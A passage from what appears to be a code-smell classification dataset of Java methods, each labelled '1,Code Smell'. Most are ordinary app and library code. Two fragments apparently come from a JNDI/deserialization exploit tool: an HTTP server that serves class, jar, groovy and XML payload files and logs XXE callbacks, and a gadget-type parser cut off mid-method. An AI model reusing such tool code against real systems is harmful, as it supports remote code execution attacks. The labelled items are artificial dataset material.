  editor.putInt(""dialog_bar_vis3"" + dialogId,bar_hidden ? 1 : 2);
  editor.putBoolean(""dialog_bar_share"" + dialogId,settings.share_contact);
  editor.putBoolean(""dialog_bar_report"" + dialogId,settings.report_spam);
  editor.putBoolean(""dialog_bar_add"" + dialogId,settings.add_contact);
  editor.putBoolean(""dialog_bar_block"" + dialogId,settings.block_contact);
  editor.putBoolean(""dialog_bar_exception"" + dialogId,settings.need_contacts_exception);
  editor.putBoolean(""dialog_bar_location"" + dialogId,settings.report_geo);
  editor.putBoolean(""dialog_bar_archived"" + dialogId,settings.autoarchived);
  editor.putBoolean(""dialog_bar_invite"" + dialogId,settings.invite_members);
  editor.putString(""dialog_bar_chat_with_admin_title"" + dialogId,settings.request_chat_title);
  editor.putBoolean(""dialog_bar_chat_with_channel"" + dialogId,settings.request_chat_broadcast);
  editor.putInt(""dialog_bar_chat_with_date"" + dialogId,settings.request_chat_date);
  if (notificationsPreferences.getInt(""dialog_bar_distance"" + dialogId,-1) != -2) {
    if ((settings.flags & 64) != 0) {
      editor.putInt(""dialog_bar_distance"" + dialogId,settings.geo_distance);
    }
 else {
      editor.remove(""dialog_bar_distance"" + dialogId);
    }
  }
  if (dialogId == getUserConfig().getClientUserId()) {
    settings.business_bot_id=UserObject.REPLY_BOT;
    settings.business_bot_manage_url=""https://telegram.org/"";
  }
  editor.apply();
  getNotificationCenter().postNotificationName(NotificationCenter.peerSettingsDidLoad,dialogId);
}",1,Code Smell
"@Override public void dismiss(){
  if (delegate != null && !delegate.canDismiss()) {
    return;
  }
  if (dismissed) {
    return;
  }
  dismissed=true;
  if (onHideListener != null) {
    onHideListener.onDismiss(this);
  }
  cancelSheetAnimation();
  long duration=0;
  onDismissAnimationStart();
  if (!allowCustomAnimation || !onCustomCloseAnimation()) {
    currentSheetAnimationType=2;
    if (navigationBarAnimation != null) {
      navigationBarAnimation.cancel();
    }
    navigationBarAnimation=ValueAnimator.ofFloat(navigationBarAlpha,0f);
    navigationBarAnimation.addUpdateListener(a -> {
      navigationBarAlpha=(float)a.getAnimatedValue();
      if (container != null) {
        container.invalidate();
      }
    }
);
    currentSheetAnimation=new AnimatorSet();
    ArrayList<Animator> animators=new ArrayList<>();
    if (containerView != null) {
      animators.add(ObjectAnimator.ofFloat(containerView,View.TRANSLATION_Y,getContainerViewHeight() + container.keyboardHeight + AndroidUtilities.dp(10)+ (scrollNavBar ? getBottomInset() : 0)));
    }
    animators.add(ObjectAnimator.ofInt(backDrawable,AnimationProperties.COLOR_DRAWABLE_ALPHA,0));
    animators.add(navigationBarAnimation);
    currentSheetAnimation.playTogether(animators);
    currentSheetAnimation.setDuration(duration=250);
    currentSheetAnimation.setInterpolator(CubicBezierInterpolator.EASE_OUT);
    currentSheetAnimation.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        if (currentSheetAnimation != null && currentSheetAnimation.equals(animation)) {
          currentSheetAnimation=null;
          currentSheetAnimationType=0;
          AndroidUtilities.runOnUIThread(() -> {
            try {
              dismissInternal();
            }
 catch (            Exception e) {
              FileLog.e(e);
            }
          }
);
        }
        NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.startAllHeavyOperations,512);
      }
      @Override public void onAnimationCancel(      Animator animation){
        if (currentSheetAnimation != null && currentSheetAnimation.equals(animation)) {
          currentSheetAnimation=null;
          currentSheetAnimationType=0;
        }
      }
    }
);
    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.stopAllHeavyOperations,512);
    currentSheetAnimation.start();
  }
  Bulletin bulletin=Bulletin.getVisibleBulletin();
  if (bulletin != null && bulletin.isShowing()) {
    if (duration > 0) {
      bulletin.hide((long)(duration * 0.6f));
    }
 else {
      bulletin.hide();
    }
  }
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.WeightedEnsembleModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.WeightedEnsembleModelProto other=(org.tribuo.protos.core.WeightedEnsembleModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getModelsList().equals(other.getModelsList()))   return false;
  if (!getWeightsList().equals(other.getWeightsList()))   return false;
  if (hasCombiner() != other.hasCombiner())   return false;
  if (hasCombiner()) {
    if (!getCombiner().equals(other.getCombiner()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",1,Code Smell
"public static SQLQueryAdapter insert(CockroachDBGlobalState globalState){
  CockroachDBTable table=globalState.getSchema().getRandomTable(t -> !t.isView());
  return insert(globalState,table);
}
public static SQLQueryAdapter insert(CockroachDBGlobalState globalState,CockroachDBTable table){
  ExpectedErrors errors=new ExpectedErrors();
  CockroachDBErrors.addExpressionErrors(errors);
  errors.add(""violates not-null constraint"");
  errors.add(""violates unique constraint"");
  errors.add(""primary key column"");
  errors.add(""cannot write directly to computed column"");
  errors.add(""failed to satisfy CHECK constraint"");
  errors.add(""violates foreign key constraint"");
  errors.add(""foreign key violation"");
  errors.add(""multi-part foreign key"");
  StringBuilder sb=new StringBuilder();
  boolean isUpsert=Randomly.getBoolean();
  if (!isUpsert) {
    sb.append(""INSERT INTO "");
  }
 else {
    sb.append(""UPSERT INTO "");
    errors.add(""UPSERT or INSERT...ON CONFLICT command cannot affect row a second time"");
  }
  sb.append(table.getName());
  sb.append("" "");
  CockroachDBExpressionGenerator gen=new CockroachDBExpressionGenerator(globalState);
  if (Randomly.getBooleanWithSmallProbability()) {
    sb.append(""DEFAULT VALUES"");
  }
 else {
    List<CockroachDBColumn> columns=table.getRandomNonEmptyColumnSubset();
    sb.append(""("");
    sb.append(columns.stream().map(c -> c.getName()).collect(Collectors.joining("", "")));
    sb.append("")"");
    sb.append("" VALUES"");
    for (int j=0; j < Randomly.smallNumber() + 1; j++) {
      if (j != 0) {
        sb.append("", "");
      }
      sb.append(""("");
      int i=0;
      for (      CockroachDBColumn c : columns) {
        if (i++ != 0) {
          sb.append("", "");
        }
        sb.append(CockroachDBVisitor.asString(gen.generateConstant(c.getType())));
      }
      sb.append("")"");
    }
  }
  if (Randomly.getBoolean() && !isUpsert) {
    sb.append("" ON CONFLICT ("");
    sb.append(table.getRandomNonEmptyColumnSubset().stream().map(c -> c.getName()).collect(Collectors.joining("", "")));
    sb.append("")"");
    sb.append("" DO "");
    if (Randomly.getBoolean()) {
      sb.append("" NOTHING "");
    }
 else {
      sb.append("" UPDATE SET "");
      List<CockroachDBColumn> columns=table.getRandomNonEmptyColumnSubset();
      int i=0;
      for (      CockroachDBColumn c : columns) {
        if (i++ != 0) {
          sb.append("", "");
        }
        sb.append(c.getName());
        sb.append("" = "");
        sb.append(CockroachDBVisitor.asString(gen.generateConstant(c.getType())));
      }
      errors.add(""UPSERT or INSERT...ON CONFLICT command cannot affect row a second time"");
    }
    errors.add(""there is no unique or exclusion constraint matching the ON CONFLICT specification"");
  }
  CockroachDBErrors.addTransactionErrors(errors);
  return new SQLQueryAdapter(sb.toString(),errors);
}",1,Code Smell
"/** 
 * This method is inspired by  {@link io.debezium.relational.history.HistoryRecordComparator}.
 */
@Override public int compareTo(BinlogOffset that){
  if (that.getOffsetKind() == BinlogOffsetKind.NON_STOPPING && this.getOffsetKind() == BinlogOffsetKind.NON_STOPPING) {
    return 0;
  }
  if (this.getOffsetKind() == BinlogOffsetKind.NON_STOPPING) {
    return 1;
  }
  if (that.getOffsetKind() == BinlogOffsetKind.NON_STOPPING) {
    return -1;
  }
  String gtidSetStr=this.getGtidSet();
  String targetGtidSetStr=that.getGtidSet();
  if (StringUtils.isNotEmpty(targetGtidSetStr)) {
    if (StringUtils.isNotEmpty(gtidSetStr)) {
      GtidSet gtidSet=new GtidSet(gtidSetStr);
      GtidSet targetGtidSet=new GtidSet(targetGtidSetStr);
      if (gtidSet.equals(targetGtidSet)) {
        long restartSkipEvents=this.getRestartSkipEvents();
        long targetRestartSkipEvents=that.getRestartSkipEvents();
        return Long.compare(restartSkipEvents,targetRestartSkipEvents);
      }
      return gtidSet.isContainedWithin(targetGtidSet) ? -1 : 1;
    }
    return -1;
  }
 else   if (StringUtils.isNotEmpty(gtidSetStr)) {
    return 1;
  }
  long serverId=this.getServerId();
  long targetServerId=that.getServerId();
  if (serverId != targetServerId) {
    long timestamp=this.getTimestampSec();
    long targetTimestamp=that.getTimestampSec();
    return Long.compare(timestamp,targetTimestamp);
  }
  if (this.getFilename().compareToIgnoreCase(that.getFilename()) != 0) {
    return this.getFilename().compareToIgnoreCase(that.getFilename());
  }
  if (this.getPosition() != that.getPosition()) {
    return Long.compare(this.getPosition(),that.getPosition());
  }
  if (this.getRestartSkipEvents() != that.getRestartSkipEvents()) {
    return Long.compare(this.getRestartSkipEvents(),that.getRestartSkipEvents());
  }
  return Long.compare(this.getRestartSkipRows(),that.getRestartSkipRows());
}",1,Code Smell
"public void loadFlickerAndSettingsItem(int currentAccount,long botId,ActionBarMenuSubItem settingsItem){
  TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(botId);
  String username=UserObject.getPublicUsername(user);
  if (username != null && Objects.equals(username,DURGER_KING_USERNAME)) {
    flickerView.setVisibility(VISIBLE);
    flickerView.setAlpha(1f);
    flickerView.setImageDrawable(SvgHelper.getDrawable(R.raw.durgerking_placeholder,getColor(Theme.key_windowBackgroundGray)));
    setupFlickerParams(false);
    return;
  }
  TLRPC.TL_attachMenuBot cachedBot=null;
  for (  TLRPC.TL_attachMenuBot bot : MediaDataController.getInstance(currentAccount).getAttachMenuBots().bots) {
    if (bot.bot_id == botId) {
      cachedBot=bot;
      break;
    }
  }
  if (cachedBot != null) {
    boolean center=false;
    TLRPC.TL_attachMenuBotIcon botIcon=MediaDataController.getPlaceholderStaticAttachMenuBotIcon(cachedBot);
    if (botIcon == null) {
      botIcon=MediaDataController.getStaticAttachMenuBotIcon(cachedBot);
      center=true;
    }
    if (botIcon != null) {
      flickerView.setVisibility(VISIBLE);
      flickerView.setAlpha(1f);
      flickerView.setImage(ImageLocation.getForDocument(botIcon.icon),null,(Drawable)null,cachedBot);
      setupFlickerParams(center);
    }
    if (settingsItem != null) {
      settingsItem.setVisibility(cachedBot.has_settings ? VISIBLE : GONE);
    }
  }
 else {
    TLRPC.TL_messages_getAttachMenuBot req=new TLRPC.TL_messages_getAttachMenuBot();
    req.bot=MessagesController.getInstance(currentAccount).getInputUser(botId);
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      if (response instanceof TLRPC.TL_attachMenuBotsBot) {
        TLRPC.TL_attachMenuBot bot=((TLRPC.TL_attachMenuBotsBot)response).bot;
        boolean center=false;
        TLRPC.TL_attachMenuBotIcon botIcon=MediaDataController.getPlaceholderStaticAttachMenuBotIcon(bot);
        if (botIcon == null) {
          botIcon=MediaDataController.getStaticAttachMenuBotIcon(bot);
          center=true;
        }
        if (botIcon != null) {
          flickerView.setVisibility(VISIBLE);
          flickerView.setAlpha(1f);
          flickerView.setImage(ImageLocation.getForDocument(botIcon.icon),null,(Drawable)null,bot);
          setupFlickerParams(center);
        }
        if (settingsItem != null) {
          settingsItem.setVisibility(bot.has_settings ? VISIBLE : GONE);
        }
      }
 else       if (settingsItem != null) {
        settingsItem.setVisibility(GONE);
      }
    }
));
  }
}",1,Code Smell
"public static void start() throws IOException {
  HttpServer httpServer=HttpServer.create(new InetSocketAddress(Config.httpPort),0);
  httpServer.createContext(""/"",new HttpHandler(){
    @Override public void handle(    HttpExchange httpExchange){
      try {
        System.out.println(ansi().render(""@|green [+]|@ New HTTP Request From >>"" + httpExchange.getRemoteAddress() + ""  ""+ httpExchange.getRequestURI()));
        String qi=String.valueOf(httpExchange.getRequestURI());
        if (qi.contains(""setPathAlias"")) {
          Config.BCEL1=qi.substring(qi.indexOf(""="") + 1);
          System.out.println(ansi().render(""@|green [+]|@ 鑾峰彇鍙傛暟鎴愬姛 >> "" + Config.BCEL1));
        }
 else         if (qi.contains(""setRoute"")) {
          Config.ROUTE=qi.substring(qi.indexOf(""="") + 1);
          System.out.println(ansi().render(""@|green [+]|@ 鑾峰彇璺敱鎴愬姛 >> "" + Config.ROUTE));
        }
        String path=httpExchange.getRequestURI().getPath();
        if (path.endsWith("".class"")) {
          handleClassRequest(httpExchange);
        }
 else         if (path.endsWith("".wsdl"")) {
          handleWSDLRequest(httpExchange);
        }
 else         if (path.endsWith("".jar"")) {
          handleJarRequest(httpExchange);
        }
 else         if (path.startsWith(""/xxelog"")) {
          handleXXELogRequest(httpExchange);
        }
 else         if (path.endsWith("".sql"")) {
          handleSQLRequest(httpExchange);
        }
 else         if (path.endsWith("".groovy"")) {
          handlerGroovyRequest(httpExchange);
        }
 else         if (path.endsWith("".xml"")) {
          handleXMLRequest(httpExchange);
        }
 else         if (path.endsWith("".txt"")) {
          handleTXTRequest(httpExchange);
        }
 else         if (path.endsWith("".yml"")) {
          handleYmlRequest(httpExchange);
        }
 else {
          handleFileRequest(httpExchange);
        }
      }
 catch (      Exception e) {
        e.printStackTrace();
      }
    }
  }
);
  httpServer.setExecutor(null);
  httpServer.start();
  System.out.println(ansi().render(""@|green [+]|@ HTTP Server Start Listening on >>"" + Config.httpPort + ""...""));
}",1,Code Smell
"@Override protected void onDraw(Canvas canvas){
  int pl=getPaddingLeft(), pt=getPaddingTop();
  canvas.save();
  path.rewind();
  for (  SpoilerEffect eff : spoilers) {
    Rect bounds=eff.getBounds();
    path.addRect(bounds.left + pl,bounds.top + pt,bounds.right + pl,bounds.bottom + pt,Path.Direction.CW);
  }
  canvas.clipPath(path,Region.Op.DIFFERENCE);
  super.onDraw(canvas);
  canvas.restore();
  canvas.save();
  canvas.clipPath(path);
  path.rewind();
  if (!spoilers.isEmpty()) {
    spoilers.get(0).getRipplePath(path);
  }
  canvas.clipPath(path);
  super.onDraw(canvas);
  canvas.restore();
  if (!spoilers.isEmpty()) {
    boolean useAlphaLayer=spoilers.get(0).getRippleProgress() != -1;
    if (useAlphaLayer) {
      canvas.saveLayer(0,0,getMeasuredWidth(),getMeasuredHeight(),null,canvas.ALL_SAVE_FLAG);
    }
 else {
      canvas.save();
    }
    canvas.translate(getPaddingLeft(),getPaddingTop() + AndroidUtilities.dp(2));
    for (    SpoilerEffect eff : spoilers) {
      eff.setColor(getPaint().getColor());
      eff.draw(canvas);
    }
    if (useAlphaLayer) {
      path.rewind();
      spoilers.get(0).getRipplePath(path);
      if (xRefPaint == null) {
        xRefPaint=new Paint(Paint.ANTI_ALIAS_FLAG);
        xRefPaint.setColor(0xff000000);
        xRefPaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.CLEAR));
      }
      canvas.drawPath(path,xRefPaint);
    }
    canvas.restore();
  }
}",1,Code Smell
"@AnyThread public void blockComponents(boolean systemApps,@NonNull String[] signatures){
  if (signatures.length == 0)   return;
  if (mFutureResult != null) {
    mFutureResult.cancel(true);
  }
  mFutureResult=ThreadUtils.postOnBackgroundThread(() -> {
    boolean canChangeComponentState=SelfPermissions.checkSelfOrRemotePermission(Manifest.permission.CHANGE_COMPONENT_ENABLED_STATE);
    if (!canChangeComponentState) {
      ApplicationInfo applicationInfo=getApplication().getApplicationInfo();
      if (systemApps || !ApplicationInfoCompat.isSystemApp(applicationInfo)) {
        ItemCount componentCount=new ItemCount();
        componentCount.packageName=applicationInfo.packageName;
        componentCount.packageLabel=applicationInfo.loadLabel(mPm).toString();
        componentCount.count=PackageUtils.getFilteredComponents(applicationInfo.packageName,UserHandleHidden.myUserId(),signatures).size();
        if (componentCount.count > 0) {
          mComponentCount.postValue(new Pair<>(Collections.singletonList(componentCount),signatures));
          return;
        }
      }
      mComponentCount.postValue(new Pair<>(Collections.emptyList(),signatures));
      return;
    }
    boolean crossUserPermission=SelfPermissions.checkSelfOrRemotePermission(ManifestCompat.permission.INTERACT_ACROSS_USERS) || SelfPermissions.checkSelfOrRemotePermission(ManifestCompat.permission.INTERACT_ACROSS_USERS_FULL);
    boolean isShell=Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && Users.getSelfOrRemoteUid() == Ops.SHELL_UID;
    List<ItemCount> componentCounts=new ArrayList<>();
    HashSet<String> packageNames=new HashSet<>();
    for (    ApplicationInfo applicationInfo : PackageUtils.getAllApplications(MATCH_UNINSTALLED_PACKAGES | PackageManagerCompat.MATCH_STATIC_SHARED_AND_SDK_LIBRARIES,!crossUserPermission)) {
      if (packageNames.contains(applicationInfo.packageName)) {
        continue;
      }
      packageNames.add(applicationInfo.packageName);
      if (ThreadUtils.isInterrupted())       return;
      if (isShell && !ApplicationInfoCompat.isTestOnly(applicationInfo))       continue;
      if (!systemApps && (applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0)       continue;
      ItemCount componentCount=new ItemCount();
      componentCount.packageName=applicationInfo.packageName;
      componentCount.packageLabel=applicationInfo.loadLabel(mPm).toString();
      componentCount.count=PackageUtils.getFilteredComponents(applicationInfo.packageName,UserHandleHidden.myUserId(),signatures).size();
      if (componentCount.count > 0)       componentCounts.add(componentCount);
    }
    mComponentCount.postValue(new Pair<>(componentCounts,signatures));
  }
);
}",1,Code Smell
"/** 
 * Returns a  {@link NetworkEndpoint} proto buffer object from the given {@code networkEndpoint}and port. The  {@code networkEndpoint} parameter cannot contain any port information, otherwise{@link IllegalArgumentException} is thrown.
 * @param networkEndpoint the source {@link NetworkEndpoint} instance without the port number
 * @param port the port number of the network endpoint.
 * @return the {@link NetworkEndpoint} instance from the parameters.
 */
public static NetworkEndpoint forNetworkEndpointAndPort(NetworkEndpoint networkEndpoint,int port){
  checkNotNull(networkEndpoint);
  checkArgument(0 <= port && port <= MAX_PORT_NUMBER,""Port out of range. Expected [0, %s], actual %s."",MAX_PORT_NUMBER,port);
switch (networkEndpoint.getType()) {
case IP:
    return networkEndpoint.toBuilder().setType(NetworkEndpoint.Type.IP_PORT).setPort(Port.newBuilder().setPortNumber(port)).build();
case HOSTNAME:
  return networkEndpoint.toBuilder().setType(NetworkEndpoint.Type.HOSTNAME_PORT).setPort(Port.newBuilder().setPortNumber(port)).build();
case IP_HOSTNAME:
return networkEndpoint.toBuilder().setType(NetworkEndpoint.Type.IP_HOSTNAME_PORT).setPort(Port.newBuilder().setPortNumber(port)).build();
case IP_PORT:
case HOSTNAME_PORT:
case IP_HOSTNAME_PORT:
case UNRECOGNIZED:
case TYPE_UNSPECIFIED:
throw new IllegalArgumentException(""Invalid NetworkEndpoint type."");
}
throw new AssertionError(String.format(""Should never happen. Unchecked NetworkEndpoint type: %s"",networkEndpoint.getType()));
}",1,Code Smell
"private ContextMenu createContextMenu(){
  if (model.getCurrentDirectory() == null) {
    return null;
  }
  var cm=new ContextMenu();
  var f=model.getHistory().getForwardHistory(8).stream().toList();
  for (int i=f.size() - 1; i >= 0; i--) {
    if (f.get(i) == null) {
      continue;
    }
    var mi=new MenuItem(f.get(i));
    int target=i + 1;
    mi.setOnAction(event -> {
      ThreadHelper.runFailableAsync(() -> {
        BooleanScope.executeExclusive(model.getBusy(),() -> {
          model.forthSync(target);
        }
);
      }
);
      event.consume();
    }
);
    cm.getItems().add(mi);
  }
  if (!f.isEmpty()) {
    cm.getItems().add(new SeparatorMenuItem());
  }
  if (model.getHistory().getCurrent() != null) {
    var current=new MenuItem(model.getHistory().getCurrent());
    current.setDisable(true);
    cm.getItems().add(current);
  }
  var b=model.getHistory().getBackwardHistory(Integer.MAX_VALUE).stream().toList();
  if (!b.isEmpty()) {
    cm.getItems().add(new SeparatorMenuItem());
  }
  for (int i=0; i < b.size(); i++) {
    if (b.get(i) == null) {
      continue;
    }
    var mi=new MenuItem(b.get(i));
    int target=i + 1;
    mi.setOnAction(event -> {
      ThreadHelper.runFailableAsync(() -> {
        BooleanScope.executeExclusive(model.getBusy(),() -> {
          model.backSync(target);
        }
);
      }
);
      event.consume();
    }
);
    cm.getItems().add(mi);
  }
  cm.addEventHandler(Menu.ON_SHOWING,e -> {
    Node content=cm.getSkin().getNode();
    if (content instanceof Region) {
      r.setMaxHeight(600);
    }
  }
);
  return cm;
}",1,Code Smell
"private void checkTextLayout(int maxWidth,boolean force){
  if (moreButtonDisabled) {
    shouldExpand=false;
  }
  if (stringBuilder != null && (maxWidth != lastMaxWidth || force)) {
    textLayout=makeTextLayout(stringBuilder,maxWidth);
    shouldExpand=textLayout.getLineCount() >= 4;
    if (NaConfig.INSTANCE.getShowFullAbout().Bool() && shouldExpand) {
      shouldExpand=false;
    }
    if (textLayout.getLineCount() >= 3 && shouldExpand) {
      int end=Math.max(textLayout.getLineStart(2),textLayout.getLineEnd(2));
      if (stringBuilder.charAt(end - 1) == '\n')       end-=1;
      needSpace=stringBuilder.charAt(end - 1) != ' ' && stringBuilder.charAt(end - 1) != '\n';
      firstThreeLinesLayout=makeTextLayout(stringBuilder.subSequence(0,end),maxWidth);
      nextLinesLayouts=new StaticLayout[textLayout.getLineCount() - 3];
      nextLinesLayoutsPositions=new Point[textLayout.getLineCount() - 3];
      int lastLine=firstThreeLinesLayout.getLineCount() - 1;
      float x=firstThreeLinesLayout.getLineRight(lastLine) + (needSpace ? SPACE : 0);
      lastInlineLine=-1;
      if (showMoreTextBackgroundView.getMeasuredWidth() <= 0) {
        showMoreTextBackgroundView.measure(MOST_SPEC,MOST_SPEC);
      }
      for (int line=3; line < textLayout.getLineCount(); ++line) {
        int s=textLayout.getLineStart(line), e=textLayout.getLineEnd(line);
        final StaticLayout layout=makeTextLayout(stringBuilder.subSequence(Math.min(s,e),Math.max(s,e)),maxWidth);
        nextLinesLayouts[line - 3]=layout;
        nextLinesLayoutsPositions[line - 3]=new Point();
        if (lastInlineLine == -1 && x > maxWidth - showMoreTextBackgroundView.getMeasuredWidth() + showMoreTextBackgroundView.getPaddingLeft()) {
          lastInlineLine=line - 3;
        }
        x+=layout.getLineRight(0) + SPACE;
      }
      if (x < maxWidth - showMoreTextBackgroundView.getMeasuredWidth() + showMoreTextBackgroundView.getPaddingLeft()) {
        shouldExpand=false;
      }
    }
    if (!shouldExpand) {
      firstThreeLinesLayout=null;
      nextLinesLayouts=null;
    }
    lastMaxWidth=maxWidth;
    container.setMinimumHeight(textHeight());
    if (shouldExpand && firstThreeLinesLayout != null) {
      setShowMoreMarginBottom(fromHeight() - AndroidUtilities.dp(8) - firstThreeLinesLayout.getLineBottom(firstThreeLinesLayout.getLineCount() - 1)- showMoreTextBackgroundView.getPaddingBottom()- showMoreTextView.getPaddingBottom()- (showMoreTextView.getLayout() == null ? 0 : showMoreTextView.getLayout().getHeight() - showMoreTextView.getLayout().getLineBottom(showMoreTextView.getLineCount() - 1)));
    }
  }
  showMoreTextView.setVisibility(shouldExpand ? View.VISIBLE : View.GONE);
  if (!shouldExpand && container.getBackground() == null) {
    container.setBackground(rippleBackground);
  }
  if (shouldExpand && expandT < 1 && container.getBackground() != null) {
    container.setBackground(null);
  }
}",1,Code Smell
"public static String getStr(String digit){
  Matcher matcher=AMOUNT_PATTERN.matcher(digit);
  if (!matcher.find()) {
    throw new BusinessException(ModuleCodeEnum.DIGIT_ERROR);
  }
  StringBuilder builder=new StringBuilder();
  BigDecimal bigDecimal=new BigDecimal(digit).setScale(4,BigDecimal.ROUND_CEILING);
  if (bigDecimal.compareTo(BigDecimal.ZERO) < 0) {
    builder.append(CN_NEGATIVE);
  }
 else   if (bigDecimal.compareTo(BigDecimal.ZERO) == 0) {
    return builder.append(CN_ZERO).append(CN_YUAN).append(CN_ZHENG).toString();
  }
  digit=bigDecimal.toPlainString();
  List<String> strings=StrUtil.split(digit,DEFAULT_PATH_SEPARATOR);
  int index=0;
  for (  String string : strings) {
    if (ObjectUtil.equal(0,index)) {
      builder.append(formatInt(string));
    }
 else {
      BigDecimal decimal=new BigDecimal(string);
      if (decimal.compareTo(BigDecimal.ZERO) == 0) {
        continue;
      }
      builder.append(formatDecimal(string));
    }
    index++;
  }
  if (ObjectUtil.equal(1,index)) {
    builder.append(CN_ZHENG);
  }
  return builder.toString();
}",1,Code Smell
"public boolean animateChange(){
  if (messageObject == null) {
    return false;
  }
  boolean changed=false;
  lastDrawingReactionButtonsTmp.clear();
  for (int i=0; i < outButtons.size(); i++) {
    outButtons.get(i).detach();
  }
  outButtons.clear();
  lastDrawingReactionButtonsTmp.putAll(lastDrawingReactionButtons);
  for (int i=0; i < reactionButtons.size(); i++) {
    ReactionButton button=reactionButtons.get(i);
    ReactionButton lastButton=lastDrawingReactionButtonsTmp.get(button.key);
    if (lastButton != null && button.isSmall != lastButton.isSmall) {
      lastButton=null;
    }
    if (lastButton != null) {
      lastDrawingReactionButtonsTmp.remove(button.key);
      if (button.x != lastButton.x || button.y != lastButton.y || button.width != lastButton.width || button.count != lastButton.count || button.choosen != lastButton.choosen || button.avatarsDrawable != null || lastButton.avatarsDrawable != null) {
        button.animateFromX=lastButton.x;
        button.animateFromY=lastButton.y;
        button.animateFromWidth=lastButton.width;
        button.fromTextColor=lastButton.lastDrawnTextColor;
        button.fromBackgroundColor=lastButton.lastDrawnBackgroundColor;
        button.animationType=ANIMATION_TYPE_MOVE;
        if (button.count != lastButton.count) {
          button.counterDrawable.setCount(lastButton.count,false);
          button.counterDrawable.setCount(button.count,true);
        }
        if (button.avatarsDrawable != null || lastButton.avatarsDrawable != null) {
          if (button.avatarsDrawable == null) {
            button.setUsers(new ArrayList<>());
          }
          if (lastButton.avatarsDrawable == null) {
            lastButton.setUsers(new ArrayList<>());
          }
          if (!equalsUsersList(lastButton.users,button.users)) {
            button.avatarsDrawable.animateFromState(lastButton.avatarsDrawable,currentAccount,false);
          }
        }
        changed=true;
      }
 else {
        button.animationType=0;
      }
    }
 else {
      changed=true;
      button.animationType=ANIMATION_TYPE_IN;
    }
  }
  if (!lastDrawingReactionButtonsTmp.isEmpty()) {
    changed=true;
    outButtons.addAll(lastDrawingReactionButtonsTmp.values());
    for (int i=0; i < outButtons.size(); i++) {
      outButtons.get(i).drawImage=outButtons.get(i).lastImageDrawn;
      outButtons.get(i).attach();
    }
  }
  if (wasDrawn && (lastDrawnX != x || lastDrawnY != y)) {
    animateMove=true;
    fromX=lastDrawnX;
    fromY=lastDrawnY;
    changed=true;
  }
  if (lastDrawnWidth != width) {
    animateWidth=true;
    fromWidth=lastDrawnWidth;
    changed=true;
  }
  if (lastDrawTotalHeight != totalHeight) {
    animateHeight=true;
    animateFromTotalHeight=lastDrawTotalHeight;
    changed=true;
  }
  return changed;
}",1,Code Smell
"public View onCreate(GalleryListScene scene){
  View bookmarksView=inflater.inflate(R.layout.bookmarks_draw,null,false);
  Toolbar toolbar=(Toolbar)ViewUtils.$$(bookmarksView,R.id.toolbar);
  final TextView tip=(TextView)ViewUtils.$$(bookmarksView,R.id.tip);
  listView=(ListView)ViewUtils.$$(bookmarksView,R.id.list_view);
  AssertUtils.assertNotNull(context);
  List<QuickSearch> quickSearchList=EhDB.getAllQuickSearch();
  final boolean judge=Settings.getShowTagTranslations();
  if (judge && 0 != quickSearchList.size()) {
    for (int i=0; i < quickSearchList.size(); i++) {
      String name=quickSearchList.get(i).getName();
      if (name != null && 2 == name.split("":"").length) {
        quickSearchList.get(i).setName(TagTranslationUtil.getTagCN(name.split("":""),ehTags));
        EhDB.updateQuickSearch(quickSearchList.get(i));
      }
    }
  }
 else   if (!judge && 0 != quickSearchList.size()) {
    for (int i=0; i < quickSearchList.size(); i++) {
      String name=quickSearchList.get(i).getName();
      if (null != name && 1 == name.split("":"").length) {
        quickSearchList.get(i).setName(quickSearchList.get(i).getKeyword());
        EhDB.updateQuickSearch(quickSearchList.get(i));
      }
    }
  }
  final List<QuickSearch> list=quickSearchList;
  final ArrayAdapter<QuickSearch> adapter=new ArrayAdapter<>(context,R.layout.item_simple_list,list);
  listView.setAdapter(adapter);
  listView.setOnItemClickListener((parent,view1,position,id) -> {
    if (null == scene.mHelper || null == scene.mUrlBuilder) {
      return;
    }
    scene.mUrlBuilder.set(list.get(position));
    scene.mUrlBuilder.setPageIndex(0);
    scene.onUpdateUrlBuilder();
    scene.mHelper.refresh();
    scene.setState(GalleryListScene.STATE_NORMAL);
    scene.closeDrawer(Gravity.RIGHT);
  }
);
  listView.setOnScrollListener(new ScrollListener());
  tip.setText(R.string.quick_search_tip);
  toolbar.setLogo(R.drawable.ic_baseline_bookmarks_24);
  toolbar.setTitle(R.string.quick_search);
  toolbar.inflateMenu(R.menu.drawer_gallery_list);
  toolbar.setOnMenuItemClickListener(item -> {
    int id=item.getItemId();
switch (id) {
case R.id.action_add:
      if (Settings.getQuickSearchTip()) {
        scene.showQuickSearchTipDialog(list,adapter,listView,tip);
      }
 else {
        scene.showAddQuickSearchDialog(list,adapter,listView,tip);
      }
    break;
case R.id.action_settings:
  scene.startScene(new Announcer(QuickSearchScene.class));
break;
}
return true;
}
);
if (0 == list.size()) {
tip.setVisibility(View.VISIBLE);
listView.setVisibility(View.GONE);
}
 else {
tip.setVisibility(View.GONE);
listView.setVisibility(View.VISIBLE);
resume();
}
toolbar.setOnClickListener(l -> {
scene.drawPager.setCurrentItem(1);
}
);
return bookmarksView;
}",1,Code Smell
"@Override public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
  try {
    int firstIndex=base.indexOf(""/"");
    int secondIndex=base.indexOf(""/"",firstIndex + 1);
    try {
      gadgetType=GadgetType.valueOf(base.substring(firstIndex + 1,secondIndex).toLowerCase());
      System.out.println(""[+] GaddgetType: "" + gadgetType);
    }
 catch (    IllegalArgumentException e) {
      throw new UnSupportedGadgetTypeException(""UnSupportGaddgetType: "" + base.substring(firstIndex + 1,secondIndex));
